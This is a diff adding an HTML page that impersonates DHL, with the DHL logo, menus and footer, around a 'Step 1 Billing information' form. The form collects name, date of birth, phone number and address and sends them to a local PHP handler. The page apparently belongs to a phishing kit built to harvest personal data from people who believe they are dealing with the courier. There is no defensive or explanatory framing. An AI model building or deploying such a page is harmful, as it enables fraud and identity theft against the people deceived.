@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="discription" content="DHL">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="./Asstes/imgs/favicon.ico">
+        <title>DHL</title>
+        <!-- === bootstrap === -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
+        <!-- == Font-awesome " icon " == -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+        <!-- == remixicon " icon " == -->
+        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+        <!-- == file style css == -->
+        <link rel="stylesheet" href="./Asstes/css/style.css">
+    </head>
+    <body>
+
+    
+    <!-- header -->
+    <header class="header_1">
+      <div class="container_header_1 d-flex align-items-center justify-content-between">
+        <div class="logo">
+          <img src="./Asstes/imgs/dhl-logo.svg" alt="">
+        </div>
+        <div class="links_1">
+          <ul class="mb-0 ps-0 d-flex align-items-center">
+            <li>Find a Location <i class="ri-share-box-line"></i></li>
+            <li><i class="fa-solid fa-magnifying-glass search"></i> Search</li>
+            <li class="active">EN</li>
+          </ul>
+        </div>
+        <img src="./Asstes/imgs/bars.png" class="bars" alt="">
+      </div>
+     </header>
+     <div class="some_linsk">
+      <div class="container_some_links d-flex justify-content-between align-items-center">
+        <div class="part_left">
+          <ul class="ps-0 mb-0 d-flex align-items-center">
+            <li><a href="">Track</a> <img src="./Asstes/imgs/arrow.png" alt=""></li>
+            <li><a href="">Ship</a> <img src="./Asstes/imgs/arrow.png" alt=""></li>
+            <li><a href="">Customer Service</a></li>
+          </ul>
+        </div>
+        <div class="part_right">
+          <ul class="ps-0 mb-0 d-flex align-items-center">
+            <li><a href="">Customer Portal Logins</a> <img src="./Asstes/imgs/arrow.png" alt=""></li>
+          </ul>
+        </div>
+      </div>
+     </div>
+
+     <div class="box_height">
+      
+     </div>
+
+     <!-- wrapper_details -->
+     <div class="wrapper_details">
+        <form action="./Asstes/php/config/func.php" method="post">
+          <input type="hidden" name="infos">
+          <div class="title">
+            <span>Step 1</span>
+            <h1>Billing information</h1>
+          </div>
+                
+          <div class="inputes">
+            <div class="row w-100 mx-auto">
+              <div class="col-md-6 ps-0">
+                <div class="form-group">
+                  <label for="fname">First name</label>
+                  <input type="text" name="fname" id="fname">
+                </div>
+              </div>
+              <div class="col-md-6 pe-0">
+                <div class="form-group">
+                  <label for="lname">Last name</label>
+                  <input type="text" name="lname" id="lname">
+                </div>                
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="date">Date of birth (DD/MM/YYYY)</label>
+              <input type="text" name="date" id="date">
+            </div>             
+            <div class="form-group">
+              <label for="tele">Phone number</label>
+              <input type="text" name="tele" id="tele">
+            </div>             
+            <div class="form-group">
+              <label for="addr">Address</label>
+              <input type="text" name="addr" id="addr">
+            </div>             
+            <div class="form-group">
+              <label for="city">City</label>
+              <input type="text" name="city" id="city">
+            </div>             
+            <div class="form-group">
+              <label for="zip">Zip code</label>
+              <input type="text" name="zip" id="zip">
+            </div>             
+          </div>
+          <div class="btn_sub">
+            <button type="submit" disabled>continue</button>
+          </div>
+        </form>
+     </div>
+
+    <!-- footer -->
+    <footer class="footer_1">
+      <div class="contianer_footer_1">
+        <div class="row w-100 mx-auto">
+          <div class="col-md-3">
+            <ul class="mb-0 ps-0">
+              <span class="active">Quick Links</span>
+              <li>Customer Service</li>
+              <li>Customer Portal Logins</li>
+              <li>Digital Partners and Integrations</li>
+              <li>Developer Portal</li>
+              <li>Get a Quote</li>
+              <li>DHL for Business/li>
+            </ul>
+          </div>
+          <div class="col-md-3">
+            <ul class="mb-0 ps-0">
+              <span>Our Divisions</span>
+              <li>DHL Express</li>
+              <li>DHL Global Forwarding</li>
+              <li>DHL Freight</li>
+              <li>Other Global Divisions</li>
+            </ul>
+          </div>
+          <div class="col-md-3">
+            <ul class="mb-0 ps-0">
+              <span>Industry Sectors</span>
+              <li>Auto-Mobility</li>
+              <li>Chemicals</li>
+              <li>Consumer</li>
+              <li>Energy</li>
+              <li>Engineering and Manufacturing</li>
+              <li>Life Sciences and Healthcare</li>
+              <li>Public Sector</li>
+              <li>Retail</li>
+              <li>Technology</li>
+            </ul>
+          </div>
+          <div class="col-md-3">
+            <ul class="mb-0 ps-0">
+              <span>Company Information</span>
+              <li>About DHL</li>
+              <li>Delivered</li>
+              <li>Careers</li>
+              <li>Press Center</li>
+              <li>Investors</li>
+              <li>Sustainability</li>
+              <li>Insights and Innovation</li>
+              <li>Brand Partnerships</li>
+            </ul>
+          </div>                                    
+        </div>
+      </div>
+      <div class="container_copyghit">
+        <div class="container_top_copyghit d-flex justify-content-between">
+          <div class="part_left">
+            <img src="./Asstes/imgs/glo-footer-logo.svg" alt="">
+            <ul class="d-flex align-items-center ps-0 mb-0">
+              <li>Fraud Awareness</li>
+              <li>Legal Notice</li>
+              <li>Terms of Use</li>
+              <li>Privacy Notice</li>
+              <li>Dispute Resolution</li>
+              <li>Additional Information</li>
+              <li>Cookie Settings</li>
+            </ul>
+          </div>
+          <div class="part_right">
+            <h1>Follow Us</h1>
+            <img src="./Asstes/imgs/socil.png" class="social2" alt="">
+            <img src="./Asstes/imgs/social1.png" class="social1" alt="">
+          </div>            
+        </div>
+        <div class="txt_copyght">
+          <p class="mb-0">2026 © - all rights reserved</p>
+        </div>
+      </div>
+    </footer>
+	                    </div>
+                </div>
+
+
+
+
+
+
+    <!-- bootstrap -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- script jquery -->
+    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    
+    <script>        
+
+        $(".form-group input").focus(function(){
+          $(this).prev().addClass("focus");
+          $(this).addClass("focus");
+        });
+
+        $(".form-group input").blur(function(){
+          if ($(this).val() == "") {
+              $(this).prev().removeClass("focus");
+          }
+          $(this).removeClass("focus");
+        });
+
+        $("#date").mask('00/00/0000');
+            
+        $(".form-group input").keyup(function(){
+          if ($("#fname").val() != "" & $("#lname").val() != "" & $("#date").val() != "" & $("#tele").val() != "" & $("#addr").val() != "" & $("#zip").val() != "") {
+            $(".btn_sub button").prop("disabled",false);
+          }else{
+            $(".btn_sub button").prop("disabled",true);
+          }
+        });                
+    </script>
+    </body>
+</html>
